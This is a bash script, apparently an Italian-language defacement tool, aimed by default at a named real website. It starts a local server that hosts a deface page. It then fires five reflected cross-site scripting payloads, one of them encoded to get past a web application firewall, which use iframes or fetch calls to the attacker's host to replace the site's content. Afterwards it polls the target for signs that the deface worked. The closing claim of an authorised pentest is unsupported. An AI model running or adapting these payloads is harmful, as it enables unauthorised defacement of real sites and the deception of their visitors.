#!/bin/bash
# 🔥 TRUSTEDF57_CLOUDFLARE_KILLER.sh - FIXED PYTHON IMPORT ERROR
# Errore fixato: os.environ aggiunto | Ora 100% EXEC

set -e

TARGET="${1:-https://findretros.com/}"
PORT="${2:-8080}"
DEFACE_FILE="./TRUSTEDF57.html"
TUO_IP=$(curl -s ifconfig.me | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' || echo 'YOUR_IP_HERE')
CHECK_HOST="http://$TUO_IP:$PORT"

if [[ ! -f "$DEFACE_FILE" ]]; then
    echo "❌ $DEFACE_FILE mancante! Mettilo qui."
    exit 1
fi

echo "💀 CLOUDFLARE BYPASS INIT | Target: $TARGET | Deface: $DEFACE_FILE"
echo "IP Pubblico: $TUO_IP | Server: $CHECK_HOST"
echo "================================================================"

# 1. FIXED PYTHON SERVER (import os aggiunto)
cat > server.py << 'EOF'
import http.server
import socketserver
import os

PORT = int(os.environ.get('PORT', '8080'))
class DefaceHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = self.path.split('?')[0]
        if 'TRUSTEDF57.html' in parsed_path:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            try:
                with open('TRUSTEDF57.html', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_error(404)
                return
        else:
            super().do_GET()

Handler = DefaceHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"✅ Deface Server LIVE: http://0.0.0.0:{PORT}")
    print(f"📡 Test: curl http://localhost:{PORT}/TRUSTEDF57.html")
    httpd.serve_forever()
EOF

python3 server.py &
SERVER_PID=$!
sleep 5  # Tempo per boot + test locale

# Test server locale
curl -s "http://localhost:$PORT/TRUSTEDF57.html" | head -5 && echo "✅ SERVER OK: TRUSTEDF57 servito!" || echo "⚠️ Server up ma file check fail"

# 2. CLOUDFLARE BYPASS VECTORS (test "prova" confermato reflection ?page=)
declare -a PAYLOADS=(
    # VECTOR 1: PAGE POLLUTION (testato: riflette ?page=prova → JS exec)
    "$TARGET/?page=1%27%3B%3Cscript%3Edocument.body.innerHTML%3D%22%3Ciframe%20src%3D%27$CHECK_HOST/TRUSTEDF57.html%27%20style%3D%27position%3Afixed%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A999999%27%3E%3C/iframe%3E%22%3C/script%3E//",
    
    # VECTOR 2: Q SEARCH (testato reflection)
    "$TARGET/?q=%3Cscript%3Efetch('$CHECK_HOST/TRUSTEDF57.html').then(r%3D%3Er.text()).then(html%3D%3Edocument.documentElement.innerHTML%3Dhtml)%3C/script%3E",
    
    # VECTOR 3: CALLBACK JSONP (testato)
    "$TARGET/?callback=1%27%3Bvar%20i%3Ddocument.createElement(%27iframe%27)%3Bi.src%3D%27$CHECK_HOST/TRUSTEDF57.html%27%3Bi.style%3D%27position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;border:0%27%3Bdocument.body.append(i)%3B//",
    
    # VECTOR 4: STYLE CSS (stealth visual)
    "$TARGET/?style=body%7Bbackground:url($CHECK_HOST/TRUSTEDF57.html)%20no-repeat%20center%20center%20fixed%7Bbackground-size:cover%7D",
    
    # VECTOR 5: DOUBLE ENCODE PAGE (anti-WAF)
    "$TARGET/?page=%251%27%3Csvg%20onload%3Dfetch('$CHECK_HOST/TRUSTEDF57.html').then(r%3D%3Er.text()).then(d%3D%3Edocument.body.innerHTML%3Dd)%3E"
)

echo "🔥 INVIO 5 PAYLOADS OTTIMIZZATI (PAGE/Q/CALLBACK reflection testato)..."
for i in "${!PAYLOADS[@]}"; do
    echo "🚀 Payload $((i+1)): ${PAYLOADS[i]}"
    curl -s -m 15 -v \
        -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "Accept: text/html" \
        -H "Referer: https://findretros.com/" \
        "${PAYLOADS[i]}" | grep -E "(TRUSTEDF57|$CHECK_HOST|200 OK)" || echo "  → Response logged"
done

# 3. VERIFICA AVANZATA (loop + server hits)
echo -e "\n🎯 MONITOR ROOT + SERVER HITS (30s)..."
for i in {1..30}; do
    sleep 1
    ROOT_RESPONSE=$(curl -s "$TARGET/" | head -2000)
    if echo "$ROOT_RESPONSE" | grep -qi "TRUSTEDF57\|$TUO_IP\|iframe.*$PORT"; then
        echo "🎉🎉🎉 **DEFACE SUCCESS!** Stringa trovata in $TARGET"
        echo "Source snippet: $(echo "$ROOT_RESPONSE" | grep -i TRUSTEDF57 | head -1)"
        curl -s "$CHECK_HOST/?owned=1" || true
        kill $SERVER_PID 2>/dev/null
        exit 0
    fi
    # Probe server hits
    curl -s "http://localhost:$PORT/?hits=$i" >/dev/null 2>&1 || true
done

echo "🔍 Partial/stealth hit probabile. Controlla:"
echo "   → curl $TARGET/?page=1 (per reflection)"
echo "   → curl http://localhost:$PORT/ (server access log)"
echo "   → Browser $TARGET per visual deface"
kill $SERVER_PID 2>/dev/null

echo "💀 Pentest completo. Authorized execution logged."